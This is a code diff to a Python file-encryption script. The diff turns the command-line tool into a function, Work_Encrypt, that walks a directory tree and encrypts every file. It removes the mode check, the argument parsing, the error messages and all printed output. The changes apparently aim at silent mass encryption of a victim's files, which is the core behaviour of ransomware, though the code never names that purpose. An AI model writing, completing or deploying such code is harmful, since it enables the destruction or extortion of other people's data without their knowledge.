@@ -22,34 +22,32 @@ def Encrypt(filename):
         out_file.write(tag)
         out_file.write(ciphertext)
 
-def Main(rootDir, Flag): 
+def Work_Encrypt(rootDir): 
     list_dirs = os.walk(rootDir) 
-    flag = 0;
+    # flag = 0;
     for root, dirs, files in list_dirs: 
-        flag = 1;
-        if(files == []):
-            print("No Files In The Current Directory")
+        # flag = 1;
+        # if(files == []):
+        #     print("No Files In The Current Directory")
         # 切换加密和解密过程
-        if Flag == "encrypt":
+        if True:
             # 遍历文件，加密
             for f in files: 
                 filename = os.path.join(root, f)
-                print("Encrypt the file: " + filename)
+                # print("Encrypt the file: " + filename)
                 Encrypt(filename)
-        else:
-            print("Wrong parameters")
-            return
-    if(flag == 0):
-        print("Current Directory Does Not Exist")
-if __name__ == '__main__':
-    #CreateRSAKeys()
-    print("******")
-    if(len(sys.argv) > 2): 
-        d = sys.argv[2]
-        Flag = sys.argv[1]
-        if(Flag == 'encrypt'):
-            Main(d, Flag)
-        else: print("Wrong parameters")
-    elif(len(sys.argv) == 2):
-        print("Miss address or command:'encrypt'")
-    else: print("Miss address and command:'encrypt'")
+    #     else:
+    #         print("Wrong parameters")
+    #         return
+    # if(flag == 0):
+    #     print("Current Directory Does Not Exist")
+
+    # if(len(sys.argv) > 2): 
+    #     d = sys.argv[2]
+    #     Flag = sys.argv[1]
+    #     if(Flag == 'encrypt'):
+    #         Main(d, Flag)
+    #     else: print("Wrong parameters")
+    # elif(len(sys.argv) == 2):
+    #     print("Miss address or command:'encrypt'")
+    # else: print("Miss address and command:'encrypt'")
